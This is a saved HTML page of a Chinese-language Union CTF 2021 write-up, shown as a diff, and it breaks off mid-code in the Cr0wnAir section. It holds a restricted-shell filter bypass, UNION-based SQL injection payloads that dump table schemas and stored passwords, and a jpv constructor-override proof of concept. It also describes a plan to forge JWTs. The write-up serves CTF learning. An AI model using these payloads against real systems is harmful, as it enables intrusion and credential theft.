@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Misc👑 Welcome 👑Rules 裡面可以找到 flag。 1union&amp;#123;r0p_s4v3_the_que3n&amp;#125;  bashlex We made a new restricted shell with fancy AST validation, and we don’t allow cat! The flag is in &#x2F;home&#x2F;bashlex&#x2F;flag.tx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Union CTF 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="Misc👑 Welcome 👑Rules 裡面可以找到 flag。 1union&amp;#123;r0p_s4v3_the_que3n&amp;#125;  bashlex We made a new restricted shell with fancy AST validation, and we don’t allow cat! The flag is in &#x2F;home&#x2F;bashlex&#x2F;flag.tx">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/temporaryButter/1614010796900.c69eb4f63ecc9ca11ca3da90eef2fef1632493c7.png">
+<meta property="article:published_time" content="2021-02-23T17:25:00.000Z">
+<meta property="article:modified_time" content="2021-04-28T08:29:25.703Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/temporaryButter/1614010796900.c69eb4f63ecc9ca11ca3da90eef2fef1632493c7.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>Union CTF 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/17a1c7f0.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/447b0fce.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/17a1c7f0.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&text=Union CTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&is_video=false&description=Union CTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Union CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&name=Union CTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&t=Union CTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%91-Welcome-%F0%9F%91%91"><span class="toc-number">1.1.</span> <span class="toc-text">👑 Welcome 👑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bashlex"><span class="toc-number">1.2.</span> <span class="toc-text">bashlex</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meet-the-Union-Committee"><span class="toc-number">2.1.</span> <span class="toc-text">Meet the Union Committee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cr0wnAir"><span class="toc-number">2.2.</span> <span class="toc-text">Cr0wnAir</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Union CTF 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-23T17:25:00.000Z" itemprop="datePublished">2021-02-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="👑-Welcome-👑"><a href="#👑-Welcome-👑" class="headerlink" title="👑 Welcome 👑"></a>👑 Welcome 👑</h3><p>Rules 裡面可以找到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;r0p_s4v3_the_que3n&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="bashlex"><a href="#bashlex" class="headerlink" title="bashlex"></a>bashlex</h3><blockquote>
+<p>We made a new restricted shell with fancy AST validation, and we don’t allow <code>cat</code>!</p>
+<p>The flag is in <code>/home/bashlex/flag.txt</code>.</p>
+</blockquote>
+<p>給出的程式碼如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bashlex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ALLOWED_COMMANDS = [<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">ast</span>):</span></span><br><span class="line">    queue = [ast]</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        node = queue.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> node.kind == <span class="string">&#x27;command&#x27;</span>:</span><br><span class="line">            first_child = node.parts[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> first_child.kind == <span class="string">&#x27;word&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> first_child.parts:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Forbidden top level command&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> first_child.word.startswith((<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Path components are forbidden&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> first_child.word.isalpha() <span class="keyword">and</span> \</span><br><span class="line">                        first_child.word <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_COMMANDS:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Forbidden command&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> node.kind == <span class="string">&#x27;commandsubstitution&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Command substitution is forbidden&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> node.kind == <span class="string">&#x27;word&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;[&#x27;</span>] <span class="keyword">if</span> c <span class="keyword">in</span> node.word]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Wildcards are forbidden&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> node.word:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag is forbidden&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Add node children</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;parts&#x27;</span>):</span><br><span class="line">            queue += node.parts</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;list&#x27;</span>):</span><br><span class="line">            <span class="comment"># CompoundNode</span></span><br><span class="line">            queue += node.<span class="built_in">list</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    inp = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parts = bashlex.parse(inp)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> parts:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> validate(p):</span><br><span class="line">                valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;INVALID&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    subprocess.call([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, inp])</span><br></pre></td></tr></table></figure>
+
+<p>首先看一下 bashlex 的抽取邏輯，以 ls 這條指令為例。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CommandNode(parts&#x3D;[WordNode(parts&#x3D;[] pos&#x3D;(0, 2) word&#x3D;&#39;ls&#39;)] pos&#x3D;(0, 2))]</span><br></pre></td></tr></table></figure>
+
+<p>CommandNode 裡包括 WordNode，每個 Node 包括 pos 和 parts。所以此時的規則大概是指令中不能含有變數、不能以路徑開頭、如果是純字母的指令則不允許白名單以外的指令。同時不可以使用 bash 的指令替代（但是這點有點迷惑）。所以只需要找到一個非純字母組成的指令即可。這裡因為是 python 的環境。於是有 python3 的指令可以被成功執行。由於沒有回顯，所以嘗試開個 http 服務。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 2333</span><br></pre></td></tr></table></figure>
+
+<p>此時訪問到<a target="_blank" rel="noopener" href="http://34.90.44.21:2333/home/bashlex/flag.txt">這裡</a>可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;chomsky_go_lllllllll1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到大佬的一種解法是用的指令替代，但是要使用雙數反引號去替代。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;`ls`</span><br><span class="line">[CommandNode(parts=[WordNode(parts=[CommandsubstitutionNode(<span class="built_in">command</span>=CommandNode(parts=[WordNode(parts=[] pos=(1, 3) word=<span class="string">&#x27;ls&#x27;</span>)] pos=(1, 3)) pos=(0, 4))] pos=(0, 4) word=<span class="string">&#x27;`ls`&#x27;</span>)] pos=(0, 4))] <span class="comment">#此時因為被 bashlex 正確解析無法透過檢測</span></span><br><span class="line">&gt;``ls``</span><br><span class="line">[CommandNode(parts=[WordNode(parts=[] pos=(0, 6) word=<span class="string">&#x27;``ls``&#x27;</span>)] pos=(0, 6))] <span class="comment">#此時解析出來只有一個 WordNode，可以正常執行</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Meet-the-Union-Committee"><a href="#Meet-the-Union-Committee" class="headerlink" title="Meet the Union Committee"></a>Meet the Union Committee</h3><blockquote>
+<p>A committee was formed last year to decide the highly-sensitive contents of our challenges. All we could find is their profiles on this website. They are super paranoid that their profile site is hackable and decided to implement insane rate limits. Really we need to get access to the admin’s password. If only that was possible.</p>
+</blockquote>
+<p>隨便點進一個人的主頁可以發現 URL 多了個 GET 引數 id。嘗試下發現存在 SQL 注入，且可以發現如下報錯。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;unionflaggenerator.py&quot;, line 49, in do_GET</span><br><span class="line">    cursor.execute(&quot;SELECT id, name, email FROM users WHERE id&#x3D;&quot; + params[&quot;id&quot;])</span><br><span class="line">sqlite3.OperationalError: near &quot;‘&quot;: syntax error</span><br></pre></td></tr></table></figure>
+
+<p>可以發現數據庫採用的是 sqlite3。嘗試構造語句讀取 sqlite_master 裡的 sql 以得出資料庫中表的結構。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%20union%20select%201,group_concat(sql),3%20from%20sqlite_master--+</span><br></pre></td></tr></table></figure>
+
+<p>可以得到如下回顯。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, email TEXT, password TEXT),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)</span><br></pre></td></tr></table></figure>
+
+<p>於是根據題目描述，嘗試讀取表中的密碼欄位，即 users 表下的 password。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%20union%20select%201,group_concat(password),3%20from%20users--+</span><br></pre></td></tr></table></figure>
+
+<p>得到如下回顯。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;uni0n_4ll_s3l3ct_n0t_4_n00b&#125;,RightBehindU,diamond69_hands420,winter2020,peter1,password,ilikesex</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;uni0n_4ll_s3l3ct_n0t_4_n00b&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cr0wnAir"><a href="#Cr0wnAir" class="headerlink" title="Cr0wnAir"></a>Cr0wnAir</h3><blockquote>
+<p>Cr0wn is getting into the airline business to make some sweet profits when everyone is able to travel again. Can you upgrade your trip?</p>
+</blockquote>
+<blockquote>
+<p>題目附件： <a target="_blank" rel="noopener" href="https://1drv.ms/u/s!Aqe9Z34waQq1kx1op6yCo_i43ijL?e=VmOaeh">https://1drv.ms/u/s!Aqe9Z34waQq1kx1op6yCo_i43ijL?e=VmOaeh</a></p>
+</blockquote>
+<p>附件下載下來，可以發現是 nodejs 的專案。首先看一下專案的 package.json。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;cr0wnAir&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;app.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;node app.js&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;hyperreality&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;4.17.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;jpv&quot;</span>: <span class="string">&quot;2.0.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;jwt-simple&quot;</span>: <span class="string">&quot;0.5.2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>npm audit</code> 可以發現報出的一個 jwt-simple 的高危漏洞，根據<a target="_blank" rel="noopener" href="https://www.npmjs.com/advisories/831">描述</a>，它允許我們使用 HS256 演算法的 token 去代替 RS256 演算法的 token 成功解碼。同時可以發現 jpv 使用的是蠻老的包。在 Synk 可以查到這個版本的<a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-JPV-536466">一個高危漏洞</a>。定位到 <a target="_blank" rel="noopener" href="https://github.com/manvel-khnkoyan/jpv/issues/6">Issue</a> 可以發現相關的 PoC 作用於 <code>jpv.validate</code> 方法上。寫一段程式碼復現這個漏洞。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jpv = <span class="built_in">require</span>(<span class="string">&quot;jpv&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> inputA = &#123;</span><br><span class="line">	a: &#123;<span class="string">&quot;nothing&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Lemon&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> inputB = &#123;</span><br><span class="line">	a: &#123;<span class="string">&quot;nothing&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> pattern = &#123;</span><br><span class="line">	a: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(jpv.validate(inputA, pattern))</span><br><span class="line"><span class="built_in">console</span>.log(jpv.validate(inputB, pattern))</span><br></pre></td></tr></table></figure>
+
+<p>得到的結果如下圖。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/temporaryButter/1614010796900.c69eb4f63ecc9ca11ca3da90eef2fef1632493c7.png"></p>
+<p>這說明我們構造的輸入覆蓋了 constructor 最終影響到了 jpv 的判斷。接下來具體看看附件給的程式碼。</p>
+<p>在 checkin.js 的第 45 行可以發現如下內容。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&quot;</span>, <span class="string">&quot;token&quot;</span>: token&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>26 行處可以找到這題 JWT 的加密方式 RS256。如果需要偽造 JWT 則必須想辦法先拿到 key。這裡可以使用 <a target="_blank" rel="noopener" href="https://github.com/silentsignal/rsa_sign2n">rsa_sig2n</a> 透過 token 去算出 key，因此至少要拿到兩個可用的 token。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> jwt.encode(body, config.privkey, <span class="string">&#x27;RS256&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>37 行處可以發現它使用到了上述高危漏洞所影響的方法，首先將這一部分判斷的程式碼摘出來。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (jpv.validate(data, pattern, &#123; <span class="attr">debug</span>: <span class="literal">true</span>, <span class="attr">mode</span>: <span class="string">&quot;strict&quot;</span> &#125;)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[<span class="string">&quot;firstName&quot;</span>] == <span class="string">&quot;Tony&quot;</span> &amp;&amp; data[<span class="string">&quot;lastName&quot;</span>] == <span class="string">&quot;Abbott&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in! Please remember not to post your boarding pass on social media.&quot;</span>&#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data[<span class="string">&quot;ffp&quot;</span>]) &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer.&quot;</span>&#125;;</span><br><span class="line">      <span class="keyword">for</span>(e <span class="keyword">in</span> data[<span class="string">&quot;extras&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;extras&quot;</span>][e][<span class="string">&quot;sssr&quot;</span>] &amp;&amp; data[<span class="string">&quot;extras&quot;</span>][e][<span class="string">&quot;sssr&quot;</span>] === <span class="string">&quot;FQTU&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> token = createToken(data[<span class="string">&quot;passport&quot;</span>], data[<span class="string">&quot;ffp&quot;</span>]);</span><br><span class="line">          <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a 